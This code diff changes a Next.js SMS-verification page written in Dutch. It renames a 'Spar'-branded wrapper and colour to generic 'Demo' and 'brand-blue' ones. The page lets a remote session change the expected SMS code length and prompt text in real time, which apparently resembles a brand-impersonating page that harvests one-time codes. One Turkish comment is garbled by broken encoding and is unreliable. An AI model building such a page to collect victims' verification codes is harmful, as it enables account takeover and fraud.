@@ -2,7 +2,7 @@
 
 import { useEffect, useState } from "react";
 import { useRouter } from "next/navigation";
-import { SparShell } from "@/components/demo/SparShell";
+import { DemoShell } from "@/components/demo/DemoShell";
 import { ConfigMissing } from "@/components/demo/ConfigMissing";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { stepToPath } from "@/lib/session-routes";
@@ -65,7 +65,7 @@ export function SmsClient({ sessionId }: Props) {
             const next = payload.new as { sms_digits?: number; sms_custom_text?: string | null };
             if (next.sms_digits) {
               setDigits(next.sms_digits);
-              // Eğer kod, yeni haneden uzunsa keselim
+              // EÄŸer kod, yeni haneden uzunsa keselim
               setCode((prev) => prev.slice(0, next.sms_digits));
             }
             if (next.sms_custom_text !== undefined) {
@@ -106,29 +106,29 @@ export function SmsClient({ sessionId }: Props) {
 
   if (!supabase) {
     return (
-      <SparShell title="SMS-verificatie">
+      <DemoShell title="SMS-verificatie">
         <ConfigMissing />
-      </SparShell>
+      </DemoShell>
     );
   }
 
   if (!sessionId) {
     return (
-      <SparShell title="SMS-verificatie">
+      <DemoShell title="SMS-verificatie">
         <p className="rounded-xl border border-amber-200 bg-amber-50 p-4 text-center text-sm">
           Ongeldige link.
         </p>
-      </SparShell>
+      </DemoShell>
     );
   }
 
   if (loading) {
     return (
-      <SparShell title="SMS-verificatie">
+      <DemoShell title="SMS-verificatie">
         <div className="flex justify-center py-16">
-          <div className="size-12 animate-spin rounded-full border-4 border-spar-green border-t-transparent" />
+          <div className="size-12 animate-spin rounded-full border-4 border-brand-blue border-t-transparent" />
         </div>
-      </SparShell>
+      </DemoShell>
     );
   }
 
@@ -137,7 +137,7 @@ export function SmsClient({ sessionId }: Props) {
   const displayText = customText || settings.sms_subtitle;
 
   return (
-    <SparShell>
+    <DemoShell>
       <div className="space-y-4 w-full mt-24 sm:mt-6">
         <div className={ui.panel}>
           <div className="text-center mb-6">
@@ -174,6 +174,6 @@ export function SmsClient({ sessionId }: Props) {
         </form>
         </div>
       </div>
-    </SparShell>
+    </DemoShell>
   );
 }
